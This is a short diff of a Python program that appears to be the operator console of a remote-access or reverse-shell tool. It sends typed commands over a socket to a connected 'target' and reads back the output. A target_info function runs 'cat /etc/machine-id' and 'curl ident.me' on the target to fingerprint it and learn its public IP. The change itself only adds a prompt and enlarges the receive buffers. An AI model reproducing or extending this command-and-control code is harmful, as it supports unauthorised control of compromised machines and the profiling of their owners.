@@ -123,7 +123,7 @@ def get_target(cmd):
 def get_target_commands(conn):
     while True:
         try:
-            cmd = input()
+            cmd = input(f"[$] ")
             if cmd == 'exit':
                 return
             response = send_target_commands(cmd, conn)
@@ -135,7 +135,7 @@ def send_target_commands(cmd, conn):
     try:
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
+            client_response = str(conn.recv(4096), "utf-8")
 
             return client_response
     except Exception:
@@ -145,11 +145,11 @@ def send_target_commands(cmd, conn):
 def target_info(conn):
     try:
         conn.send(str.encode('cat /etc/machine-id'))
-        client_hwid = str(conn.recv(1024), "utf-8")
+        client_hwid = str(conn.recv(4096), "utf-8")
         hwid = client_hwid.split(maxsplit=1)[0]
 
         conn.send(str.encode('curl ident.me'))
-        client_ipaddr = str(conn.recv(1024), "utf-8")
+        client_ipaddr = str(conn.recv(4096), "utf-8")
         client_ip = client_ipaddr.split(maxsplit=1)[0]
 
         return hwid, client_ip
